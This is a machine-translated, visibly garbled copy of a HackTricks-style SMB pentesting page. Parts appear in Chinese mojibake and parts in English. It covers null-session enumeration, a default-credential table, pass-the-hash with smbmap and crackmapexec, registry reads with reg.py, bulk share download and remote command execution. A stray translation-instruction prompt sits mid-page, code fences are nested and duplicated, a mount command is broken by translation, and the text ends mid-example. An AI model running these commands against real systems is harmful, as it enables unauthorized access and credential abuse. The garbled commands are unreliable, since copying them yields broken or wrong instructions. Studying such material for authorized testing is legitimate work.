# 139,445 - SMB æ¸—é€æµ‹è¯•

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨ HackTricks ä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–æœ€æ–°ç‰ˆæœ¬çš„ PEASS æˆ–ä¸‹è½½ HackTricks çš„ PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘[hacktricks ä»“åº“](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud ä»“åº“](https://github.com/carlospolop/hacktricks-cloud)æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

## **ç«¯å£ 139**

**NetBIOS** ä»£è¡¨ _ç½‘ç»œåŸºæœ¬è¾“å…¥è¾“å‡ºç³»ç»Ÿ_ã€‚å®ƒæ˜¯ä¸€ç§è½¯ä»¶åè®®ï¼Œå…è®¸å±€åŸŸç½‘ï¼ˆLANï¼‰ä¸Šçš„åº”ç”¨ç¨‹åºã€ä¸ªäººç”µè„‘å’Œæ¡Œé¢ç”µè„‘ä¸ç½‘ç»œç¡¬ä»¶è¿›è¡Œé€šä¿¡ï¼Œå¹¶åœ¨ç½‘ç»œä¸Šä¼ è¾“æ•°æ®ã€‚åœ¨ NetBIOS ç½‘ç»œä¸Šè¿è¡Œçš„è½¯ä»¶åº”ç”¨ç¨‹åºé€šè¿‡å®ƒä»¬çš„ NetBIOS åç§°å®šä½å’Œè¯†åˆ«å½¼æ­¤ã€‚NetBIOS åç§°æœ€é•¿å¯è¾¾ 16 ä¸ªå­—ç¬¦ï¼Œå¹¶ä¸”é€šå¸¸ä¸è®¡ç®—æœºåç§°åˆ†å¼€ã€‚å½“ä¸€ä¸ªåº”ç”¨ç¨‹åºï¼ˆå®¢æˆ·ç«¯ï¼‰é€šè¿‡ **TCP ç«¯å£ 139** å‘é€å‘½ä»¤â€œå‘¼å«â€å¦ä¸€ä¸ªå®¢æˆ·ç«¯ï¼ˆæœåŠ¡å™¨ï¼‰æ—¶ï¼Œå®ƒä»¬ä¼šå¯åŠ¨ä¸€ä¸ª NetBIOS ä¼šè¯ã€‚ï¼ˆæ‘˜è‡ª[è¿™é‡Œ](https://www.thewindowsclub.com/smb-port-what-is-port-445-port-139-used-for)ï¼‰
```
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
```
## ç«¯å£445

è™½ç„¶ç«¯å£139åœ¨æŠ€æœ¯ä¸Šè¢«ç§°ä¸ºâ€œNBT over IPâ€ï¼Œä½†ç«¯å£445æ˜¯â€œSMB over IPâ€ã€‚**SMB**ä»£è¡¨â€œ**Server Message Blocks**â€ã€‚ç°ä»£è¯­è¨€ä¸­ï¼ŒServer Message Blockä¹Ÿè¢«ç§°ä¸º**Common Internet File System**ã€‚è¯¥ç³»ç»Ÿä½œä¸ºåº”ç”¨å±‚ç½‘ç»œåè®®ä¸»è¦ç”¨äºåœ¨ç½‘ç»œä¸Šçš„èŠ‚ç‚¹ä¹‹é—´æä¾›å…±äº«æ–‡ä»¶ã€æ‰“å°æœºã€ä¸²å£å’Œå…¶ä»–é€šä¿¡æ–¹å¼ã€‚

ä¾‹å¦‚ï¼Œåœ¨Windowsä¸Šï¼ŒSMBå¯ä»¥ç›´æ¥åœ¨TCP/IPä¸Šè¿è¡Œï¼Œè€Œæ— éœ€NetBIOS over TCP/IPã€‚æ­£å¦‚ä½ æ‰€æŒ‡å‡ºçš„ï¼Œè¿™å°†ä½¿ç”¨ç«¯å£445ã€‚åœ¨å…¶ä»–ç³»ç»Ÿä¸Šï¼Œä½ ä¼šå‘ç°æœåŠ¡å’Œåº”ç”¨ç¨‹åºä½¿ç”¨ç«¯å£139ã€‚è¿™æ„å‘³ç€SMBæ­£åœ¨ä½¿ç”¨NetBIOS over TCP/IPã€‚ï¼ˆæ‘˜è‡ª[è¿™é‡Œ](https://www.thewindowsclub.com/smb-port-what-is-port-445-port-139-used-for)ï¼‰
```
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
```
### SMB

Server Message Block (`SMB`) æ˜¯ä¸€ç§**å®¢æˆ·ç«¯-æœåŠ¡å™¨**åè®®ï¼Œç”¨äºç®¡ç†å¯¹æ–‡ä»¶ã€æ•´ä¸ªç›®å½•å’Œå…¶ä»–ç½‘ç»œèµ„æºï¼ˆå¦‚æ‰“å°æœºã€è·¯ç”±å™¨æˆ–ç½‘ç»œæ¥å£ï¼‰çš„è®¿é—®ã€‚è¯¥åè®®çš„ä¸»è¦åº”ç”¨é¢†åŸŸæ˜¯ç‰¹å®šçš„**Windows**æ“ä½œç³»ç»Ÿç³»åˆ—ï¼Œå…¶ç½‘ç»œæœåŠ¡ä»¥å‘ä¸‹å…¼å®¹çš„æ–¹å¼æ”¯æŒSMB - è¿™æ„å‘³ç€å…·æœ‰è¾ƒæ–°ç‰ˆæœ¬çš„è®¾å¤‡å¯ä»¥è½»æ¾ä¸å®‰è£…æœ‰è¾ƒæ—§Microsoftæ“ä½œç³»ç»Ÿçš„è®¾å¤‡è¿›è¡Œé€šä¿¡ã€‚\
é€šè¿‡å…è´¹è½¯ä»¶é¡¹ç›®**Samba**ï¼Œè¿˜å¯ä»¥åœ¨Linuxå’ŒUnixå‘è¡Œç‰ˆä¸­ä½¿ç”¨**SMB**ï¼Œä»è€Œå®ç°è·¨å¹³å°çš„SMBé€šä¿¡ã€‚

SMBæœåŠ¡å™¨å¯ä»¥å°†å…¶æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿçš„**ä»»æ„éƒ¨åˆ†ä½œä¸ºå…±äº«**æä¾›ã€‚å› æ­¤ï¼Œå¯¹å®¢æˆ·ç«¯å¯è§çš„**å±‚æ¬¡ç»“æ„**éƒ¨åˆ†ä¸Š**ç‹¬ç«‹äºæœåŠ¡å™¨ä¸Šçš„ç»“æ„**ã€‚**è®¿é—®æƒé™**ç”±`è®¿é—®æ§åˆ¶åˆ—è¡¨`ï¼ˆ`ACL`ï¼‰å®šä¹‰ã€‚å®ƒä»¬å¯ä»¥æ ¹æ®**`æ‰§è¡Œ`**ã€**`è¯»å–`**å’Œ**`å®Œå…¨è®¿é—®`**ç­‰å±æ€§ä»¥**ç»†ç²’åº¦çš„æ–¹å¼**å¯¹ä¸ªåˆ«ç”¨æˆ·æˆ–ç”¨æˆ·ç»„è¿›è¡Œæ§åˆ¶ã€‚**ACL**æ˜¯åŸºäºå…±äº«å®šä¹‰çš„ï¼Œå› æ­¤ä¸åœ¨æœåŠ¡å™¨ä¸Šæœ¬åœ°åˆ†é…çš„æƒé™ä¸å¯¹åº”ã€‚

### IPC$ å…±äº«

æ¥è‡ªä¹¦ç± _**Network Security Assessment 3rd edition**_

é€šè¿‡åŒ¿åç©ºä¼šè¯ï¼Œæ‚¨å¯ä»¥è®¿é—®IPC$å…±äº«å¹¶ä¸é€šè¿‡å‘½åç®¡é“å…¬å¼€çš„æœåŠ¡è¿›è¡Œäº¤äº’ã€‚Kali Linuxä¸­çš„enum4linuxå®ç”¨ç¨‹åºéå¸¸æœ‰ç”¨ï¼›ä½¿ç”¨å®ƒï¼Œæ‚¨å¯ä»¥è·å–ä»¥ä¸‹ä¿¡æ¯ï¼š

* æ“ä½œç³»ç»Ÿä¿¡æ¯
* çˆ¶åŸŸçš„è¯¦ç»†ä¿¡æ¯
* æœ¬åœ°ç”¨æˆ·å’Œç»„åˆ—è¡¨
* å¯ç”¨SMBå…±äº«çš„è¯¦ç»†ä¿¡æ¯
* æœ‰æ•ˆçš„ç³»ç»Ÿå®‰å…¨ç­–ç•¥

## ä»€ä¹ˆæ˜¯NTLM

å¦‚æœæ‚¨ä¸çŸ¥é“ä»€ä¹ˆæ˜¯NTLMï¼Œæˆ–è€…æƒ³äº†è§£å®ƒæ˜¯å¦‚ä½•å·¥ä½œå’Œå¦‚ä½•æ»¥ç”¨å®ƒçš„ï¼Œæ‚¨ä¼šå‘ç°è¿™ä¸ªå…³äº**NTLM**çš„é¡µé¢éå¸¸æœ‰è¶£ï¼Œå…¶ä¸­è§£é‡Šäº†**è¯¥åè®®çš„å·¥ä½œåŸç†ä»¥åŠæ‚¨å¦‚ä½•åˆ©ç”¨å®ƒï¼š**

{% content-ref url="../windows-hardening/ntlm/" %}
[ntlm](../windows-hardening/ntlm/)
{% endcontent-ref %}

## **æœåŠ¡å™¨æšä¸¾**

### **æ‰«æ**ç½‘ç»œä»¥æœç´¢ä¸»æœºï¼š
```bash
nbtscan -r 192.168.0.1/24
```
### SMB æœåŠ¡å™¨ç‰ˆæœ¬

ä¸ºäº†å¯»æ‰¾å¯èƒ½çš„ SMB ç‰ˆæœ¬æ¼æ´ï¼Œäº†è§£æ­£åœ¨ä½¿ç”¨çš„ç‰ˆæœ¬éå¸¸é‡è¦ã€‚å¦‚æœè¿™äº›ä¿¡æ¯åœ¨å…¶ä»–å·¥å…·ä¸­æ²¡æœ‰æ˜¾ç¤ºï¼Œä½ å¯ä»¥ï¼š

* ä½¿ç”¨ **MSF** è¾…åŠ©æ¨¡å— \_**auxiliary/scanner/smb/smb\_version**
* æˆ–è€…ä½¿ç”¨ä»¥ä¸‹è„šæœ¬ï¼š
```bash
#!/bin/sh
#Author: rewardone
#Description:
# Requires root or enough permissions to use tcpdump
# Will listen for the first 7 packets of a null login
# and grab the SMB Version
#Notes:
# Will sometimes not capture or will print multiple
# lines. May need to run a second time for success.
if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
if [ ! -z $2 ]; then rport=$2; else rport=139; fi
tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
echo "" && sleep .1
```
### **æœç´¢æ¼æ´**

To search for exploits, you can use various tools and resources. Here are some common methods:

- **Exploit Databases**: Websites like Exploit-DB, Rapid7, and Metasploit provide extensive databases of known exploits. You can search these databases using relevant keywords or specific vulnerabilities.

- **Vulnerability Scanners**: Tools like Nessus, OpenVAS, and Nexpose can scan networks and systems for known vulnerabilities and provide a list of potential exploits.

- **Security Bulletins**: Software vendors and security organizations often release security bulletins that detail vulnerabilities and their associated exploits. These bulletins can be found on the vendor's website or through security advisory services.

- **Exploit Frameworks**: Frameworks like Metasploit offer a wide range of exploits and payloads that can be used for penetration testing. These frameworks provide a command-line interface for searching and executing exploits.

Remember to always use these tools and resources responsibly and with proper authorization. Unauthorized exploitation of vulnerabilities is illegal and unethical.
```bash
msf> search type:exploit platform:windows target:2008 smb
searchsploit microsoft smb
```
### **å¯èƒ½çš„**å‡­æ®

| **ç”¨æˆ·å**           | **å¸¸è§å¯†ç **                              |
| -------------------- | ----------------------------------------- |
| _(ç©ºç™½)_             | _(ç©ºç™½)_                                 |
| guest                | _(ç©ºç™½)_                                 |
| Administrator, admin | _(ç©ºç™½)_, password, administrator, admin |
| arcserve             | arcserve, backup                          |
| tivoli, tmersrvd     | tivoli, tmersrvd, admin                   |
| backupexec, backup   | backupexec, backup, arcada                |
| test, lab, demo      | password, test, lab, demo                 |

### SMBç¯å¢ƒä¿¡æ¯

### è·å–ä¿¡æ¯
```bash
#Dump interesting information
enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
enum4linux-ng -A [-u "<username>" -p "<passwd>"] <IP>
nmap --script "safe or smb-enum-*" -p 445 <IP>

#Connect to the rpc
rpcclient -U "" -N <IP> #No creds
rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
rpcclient -U "username%passwd" <IP> #With creds
#You can use querydispinfo and enumdomusers to query user information

#Dump user information
/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]<targetName or address>

#Map possible RPC endpoints
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]<targetName or address>
```
### æšä¸¾ç”¨æˆ·ã€ç»„å’Œå·²ç™»å½•ç”¨æˆ·


# è¿™äº›ä¿¡æ¯åº”è¯¥å·²ç»ä»enum4linuxå’Œenum4linux-ngä¸­æ”¶é›†åˆ°äº†
```bash
crackmapexec smb 10.10.10.10 --users [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups --loggedon-users [-u <username> -p <password>]

ldapsearch -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "(&(objectclass=user))" -h 10.10.10.10 | grep -i samaccountname: | cut -f 2 -d " "

rpcclient -U "" -N 10.10.10.10
enumdomusers
enumdomgroups
```
### æšä¸¾æœ¬åœ°ç”¨æˆ·
[Impacket](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py)
```bash
lookupsid.py -no-pass hostname.local
```
ä»¥ä¸‹æ˜¯å…³äºé»‘å®¢æŠ€æœ¯çš„ä¸€æœ¬ä¹¦ä¸­çš„å†…å®¹ã€‚ä»¥ä¸‹å†…å®¹æ¥è‡ªæ–‡ä»¶network-services-pentesting/pentesting-smb.mdã€‚å°†ç›¸å…³çš„è‹±æ–‡æ–‡æœ¬ç¿»è¯‘æˆä¸­æ–‡ï¼Œå¹¶è¿”å›ç¿»è¯‘ç»“æœï¼Œä¿æŒå®Œå…¨ç›¸åŒçš„markdownå’Œhtmlè¯­æ³•ã€‚è¯·ä¸è¦ç¿»è¯‘ä»£ç ã€é»‘å®¢æŠ€æœ¯åç§°ã€é»‘å®¢æœ¯è¯­ã€äº‘/SaaSå¹³å°åç§°ï¼ˆå¦‚Workspaceã€awsã€gcp...ï¼‰ã€æ³„æ¼ä¸€è¯ã€æ¸—é€æµ‹è¯•å’Œmarkdownæ ‡ç­¾ã€‚æ­¤å¤–ï¼Œè¯·ä¸è¦æ·»åŠ ä»»ä½•é¢å¤–çš„å†…å®¹ï¼Œåªéœ€æä¾›ç¿»è¯‘å’Œmarkdownè¯­æ³•å³å¯ã€‚
```bash
for i in $(seq 500 1100);do rpcclient -N -U "" 10.10.10.10 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```
### Metasploit - æšä¸¾æœ¬åœ°ç”¨æˆ·
```bash
use auxiliary/scanner/smb/smb_lookupsid
set rhosts ä¸»æœºå.local
run
```

### **Enumerating LSARPC and SAMR rpcclient**

{% content-ref url="pentesting-smb/rpcclient-enumeration.md" %}
[rpcclient-enumeration.md](pentesting-smb/rpcclient-enumeration.md)
{% endcontent-ref %}

### GUI connection from linux

#### In the terminal:

`xdg-open smb://cascade.htb/`

#### In file browser window (nautilus, thunar, etc)

`smb://friendzone.htb/general/`

## Shared Folders Enumeration

### List shared folders

It is always recommended to look if you can access to anything, if you don't have credentials try using **null** **credentials/guest user**.

```bash
```markdown
## smbclient --no-pass -L //<IP> # ç©ºç”¨æˆ·
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> # å¦‚æœçœç•¥å¯†ç ï¼Œå°†æç¤ºè¾“å…¥ã€‚ä½¿ç”¨ --pw-nt-hashï¼Œæä¾›çš„å¯†ç æ˜¯NTå“ˆå¸Œå€¼

## smbmap -H <IP> [-P <PORT>] # ç©ºç”¨æˆ·
smbmap -u "username" -p "password" -H <IP> [-P <PORT>] # å‡­è¯
smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] # Pass-the-Hash
smbmap -R -u "username" -p "password" -H <IP> [-P <PORT>] # é€’å½’åˆ—è¡¨

## crackmapexec smb <IP> -u '' -p '' --shares # ç©ºç”¨æˆ·
crackmapexec smb <IP> -u 'username' -p 'password' --shares # Guestç”¨æˆ·
crackmapexec smb <IP> -u 'username' -H '<HASH>' --shares # Guestç”¨æˆ·
```
```

### **Connect/List a shared folder**

```bash
# ä½¿ç”¨smbclientè¿›è¡Œè¿æ¥
smbclient --no-pass //<IP>/<Folder>
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #å¦‚æœçœç•¥å¯†ç ï¼Œå°†ä¼šæç¤ºè¾“å…¥ã€‚ä½¿ç”¨--pw-nt-hashï¼Œæä¾›çš„å¯†ç æ˜¯NTå“ˆå¸Œå€¼
# ä½¿ç”¨--no-pass -c 'recurse;ls' ä»¥smbclienté€’å½’åˆ—å‡ºæ–‡ä»¶åˆ—è¡¨

# ä½¿ç”¨smbmapè¿›è¡Œåˆ—å‡ºï¼Œä¸æŒ‡å®šæ–‡ä»¶å¤¹å°†åˆ—å‡ºæ‰€æœ‰å†…å®¹
smbmap [-u "username" -p "password"] -R [Folder] -H <IP> [-P <PORT>] # é€’å½’åˆ—å‡º
smbmap [-u "username" -p "password"] -r [Folder] -H <IP> [-P <PORT>] # éé€’å½’åˆ—å‡º
smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [Folder] -H <IP> [-P <PORT>] # ä½¿ç”¨å“ˆå¸Œä¼ é€’å¯†ç 
```

### **Manually enumerate windows shares and connect to them**

It may be possible that you are restricted to display any shares of the host machine and when you try to list them it appears as if there aren't any shares to connect to. Thus it might be worth a short to try to manually connect to a share. To enumerate the shares manually you might want to look for responses like NT\_STATUS\_ACCESS\_DENIED and NT\_STATUS\_BAD\_NETWORK\_NAME, when using a valid session (e.g. null session or valid credentials). These may indicate whether the share exists and you do not have access to it or the share does not exist at all.

Common share names for windows targets are

* C$
* D$
* ADMIN$
* IPC$
* PRINT$
* FAX$
* SYSVOL
* NETLOGON

(Common share names from _**Network Security Assessment 3rd edition**_)

You can try to connect to them by using the following command

```bash
```markdown
ä½¿ç”¨ç©ºä¼šè¯è¿æ¥åˆ°Windowså…±äº«ï¼š
```
```bash
smbclient -U '%' -N \\\\<IP>\\<SHARE>
```

```markdown
ä½¿ç”¨èº«ä»½éªŒè¯ä¼šè¯è¿æ¥åˆ°Windowså…±äº«ï¼ˆå°†æç¤ºè¾“å…¥å¯†ç ï¼‰ï¼š
```
```bash
smbclient -U '<USER>' \\\\<IP>\\<SHARE>
```
```

or this script (using a null session)

```bash
#/bin/bash

ip='<TARGET-IP-HERE>'
shares=('C$' 'D$' 'ADMIN$' 'IPC$' 'PRINT$' 'FAX$' 'SYSVOL' 'NETLOGON')

for share in ${shares[*]}; do
output=$(smbclient -U '%' -N \\\\$ip\\$share -c '')

if [[ -z $output ]]; then
echo "[+] å¯ä»¥åˆ›å»ºä¸€ä¸ªç©ºä¼šè¯æ¥è®¿é—® $share" # å¦‚æœå‘½ä»¤æˆåŠŸæ‰§è¡Œï¼Œæ²¡æœ‰è¾“å‡ºï¼Œå› æ­¤å‡è®¾å·²åˆ›å»ºä¼šè¯
else
echo $output # è¾“å‡ºé”™è¯¯ä¿¡æ¯ï¼ˆä¾‹å¦‚ NT_STATUS_ACCESS_DENIED æˆ– NT_STATUS_BAD_NETWORK_NAMEï¼‰
fi
done
```

examples

```bash
```markdown
## SMBæœåŠ¡æ¸—é€

### smbclientå‘½ä»¤

ä½¿ç”¨`smbclient`å‘½ä»¤å¯ä»¥ä¸SMBæœåŠ¡è¿›è¡Œäº¤äº’ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„`smbclient`å‘½ä»¤ç¤ºä¾‹ï¼š

- `smbclient -U '%' -N \\\\192.168.0.24\\im_clearly_not_here`ï¼šè¿”å›`NT_STATUS_BAD_NETWORK_NAME`é”™è¯¯ã€‚
- `smbclient -U '%' -N \\\\192.168.0.24\\ADMIN$`ï¼šè¿”å›`NT_STATUS_ACCESS_DENIED`é”™è¯¯ï¼Œæˆ–è€…ç”šè‡³ä¼šç»™ä½ ä¸€ä¸ªä¼šè¯ã€‚
```

```html
<h2>SMBæœåŠ¡æ¸—é€</h2>

<h3>smbclientå‘½ä»¤</h3>

<p>ä½¿ç”¨<code>smbclient</code>å‘½ä»¤å¯ä»¥ä¸SMBæœåŠ¡è¿›è¡Œäº¤äº’ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„<code>smbclient</code>å‘½ä»¤ç¤ºä¾‹ï¼š</p>

<ul>
<li><code>smbclient -U '%' -N \\\\192.168.0.24\\im_clearly_not_here</code>ï¼šè¿”å›<code>NT_STATUS_BAD_NETWORK_NAME</code>é”™è¯¯ã€‚</li>
<li><code>smbclient -U '%' -N \\\\192.168.0.24\\ADMIN$</code>ï¼šè¿”å›<code>NT_STATUS_ACCESS_DENIED</code>é”™è¯¯ï¼Œæˆ–è€…ç”šè‡³ä¼šç»™ä½ ä¸€ä¸ªä¼šè¯ã€‚</li>
</ul>
```
```

### Mount a shared folder

```bash
```shell
æŒ‚è½½ -t cifs //x.x.x.x/share /mnt/share
æŒ‚è½½ -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share
```
```

### **Download files**

Read previous sections to learn how to connect with credentials/Pass-the-Hash.

```bash
#æœç´¢å¹¶ä¸‹è½½æ–‡ä»¶
sudo smbmap -R æ–‡ä»¶å¤¹ -H <IP> -A <æ–‡ä»¶å> -q # ä»¥é€’å½’æ¨¡å¼æœç´¢æ–‡ä»¶å¹¶å°†å…¶ä¸‹è½½åˆ° /usr/share/smbmap ä¸­
```

```bash
# ä¸‹è½½å…¨éƒ¨æ–‡ä»¶
smbclient //<IP>/<å…±äº«ç›®å½•>
> mask ""
> recurse
> prompt
> mget *
# å°†æ‰€æœ‰æ–‡ä»¶ä¸‹è½½åˆ°å½“å‰ç›®å½•
```

Commands:

* mask: specifies the mask which is used to filter the files within the directory (e.g. "" for all files)
* recurse: toggles recursion on (default: off)
* prompt: toggles prompting for filenames off (default: on)
* mget: copies all files matching the mask from host to client machine

(_Information from the manpage of smbclient_)

### Domain Shared Folders Search

* [**Snaffler**](https://github.com/SnaffCon/Snaffler)****

```bash
```
Snaffler.exe -s -d domain.local -o snaffler.log -v data
```

ä½¿ç”¨Snaffler.exeå·¥å…·ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š

```
Snaffler.exe -s -d domain.local -o snaffler.log -v data
```

- `-s` å‚æ•°è¡¨ç¤ºå¯ç”¨æ‰«ææ¨¡å¼ã€‚
- `-d domain.local` å‚æ•°æŒ‡å®šè¦æ‰«æçš„ç›®æ ‡åŸŸåã€‚
- `-o snaffler.log` å‚æ•°å°†æ‰«æç»“æœè¾“å‡ºåˆ°åä¸ºsnaffler.logçš„æ—¥å¿—æ–‡ä»¶ä¸­ã€‚
- `-v data` å‚æ•°è¡¨ç¤ºè¯¦ç»†è¾“å‡ºæ‰«æç»“æœçš„æ•°æ®ä¿¡æ¯ã€‚
```

* [**CrackMapExec**](https://wiki.porchetta.industries/smb-protocol/spidering-shares) spider.
* `-M spider_plus [--share <share_name>]`
* `--pattern txt`

```bash
```
sudo crackmapexec smb 10.10.10.10 -u ç”¨æˆ·å -p å¯†ç  -M spider_plus --share 'éƒ¨é—¨å…±äº«'
```
```

Specially interesting from shares are the files called **`Registry.xml`** as they **may contain passwords** for users configured with **autologon** via Group Policy. Or **`web.config`** files as they contains credentials.

{% hint style="info" %}
The **SYSVOL share** is **readable** by all authenticated users in the domain. In there you may **find** many different batch, VBScript, and PowerShell **scripts**.\
You should **check** the **scripts** inside of it as you might **find** sensitive info such as **passwords**.
{% endhint %}

## Read Registry

You may be able to **read the registry** using some discovered credentials. Impacket **`reg.py`** allows you to try:

```bash
```
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKCU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKLM -s
```

```
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKCU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKLM -s
```
```

## Post Exploitation

The **default config of** a **Samba** server is usually located in `/etc/samba/smb.conf` and might have some **dangerous configs**:

| **Setting**                 | **Description**                                                     |
| --------------------------- | ------------------------------------------------------------------- |
| `browseable = yes`          | Allow listing available shares in the current share?                |
| `read only = no`            | Forbid the creation and modification of files?                      |
| `writable = yes`            | Allow users to create and modify files?                             |
| `guest ok = yes`            | Allow connecting to the service without using a password?           |
| `enable privileges = yes`   | Honor privileges assigned to specific SID?                          |
| `create mask = 0777`        | What permissions must be assigned to the newly created files?       |
| `directory mask = 0777`     | What permissions must be assigned to the newly created directories? |
| `logon script = script.sh`  | What script needs to be executed on the user's login?               |
| `magic script = script.sh`  | Which script should be executed when the script gets closed?        |
| `magic output = script.out` | Where the output of the magic script needs to be stored?            |

The command `smbstatus` gives information about the **server** and about **who is connected**.

## Authenticate using Kerberos

You can **authenticate** to **kerberos** using the tools **smbclient** and **rpcclient**:

```bash
```markdown
## SMB (Server Message Block) æ¸—é€æµ‹è¯•

### smbclient --kerberos //ws01win10.domain.com/C$

ä½¿ç”¨ `smbclient` å‘½ä»¤ä¸ SMB æœåŠ¡å™¨å»ºç«‹è¿æ¥ï¼Œå¹¶ä½¿ç”¨ Kerberos èº«ä»½éªŒè¯ã€‚è¿æ¥çš„ç›®æ ‡æ˜¯ `ws01win10.domain.com` ä¸»æœºä¸Šçš„å…±äº«æ–‡ä»¶å¤¹ `C$`ã€‚

### rpcclient -k ws01win10.domain.com

ä½¿ç”¨ `rpcclient` å‘½ä»¤ä¸ SMB æœåŠ¡å™¨å»ºç«‹è¿æ¥ï¼Œå¹¶ä½¿ç”¨ Kerberos èº«ä»½éªŒè¯ã€‚è¿æ¥çš„ç›®æ ‡æ˜¯ `ws01win10.domain.com` ä¸»æœºã€‚
```

```html
<h2>SMB (Server Message Block) æ¸—é€æµ‹è¯•</h2>

<h3>smbclient --kerberos //ws01win10.domain.com/C$</h3>

<p>ä½¿ç”¨ <code>smbclient</code> å‘½ä»¤ä¸ SMB æœåŠ¡å™¨å»ºç«‹è¿æ¥ï¼Œå¹¶ä½¿ç”¨ Kerberos èº«ä»½éªŒè¯ã€‚è¿æ¥çš„ç›®æ ‡æ˜¯ <code>ws01win10.domain.com</code> ä¸»æœºä¸Šçš„å…±äº«æ–‡ä»¶å¤¹ <code>C$</code>ã€‚</p>

<h3>rpcclient -k ws01win10.domain.com</h3>

<p>ä½¿ç”¨ <code>rpcclient</code> å‘½ä»¤ä¸ SMB æœåŠ¡å™¨å»ºç«‹è¿æ¥ï¼Œå¹¶ä½¿ç”¨ Kerberos èº«ä»½éªŒè¯ã€‚è¿æ¥çš„ç›®æ ‡æ˜¯ <code>ws01win10.domain.com</code> ä¸»æœºã€‚</p>
```
```

## **Execute Commands**

### **crackmapexec**

crackmapexec can execute commands **abusing** any of **mmcexec, smbexec, atexec, wmiexec** being **wmiexec** the **default** method. You can indicate which option you prefer to use with the parameter `--exec-method`:

```bash
```markdown
å®‰è£…crackmapexecï¼š
```
```shell
apt-get install crackmapexec
```

```markdown
æ‰§è¡ŒPowershellå‘½ä»¤ï¼š
```
```shell
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'
```

```markdown
æ‰§è¡Œcmdå‘½ä»¤ï¼š
```
```shell
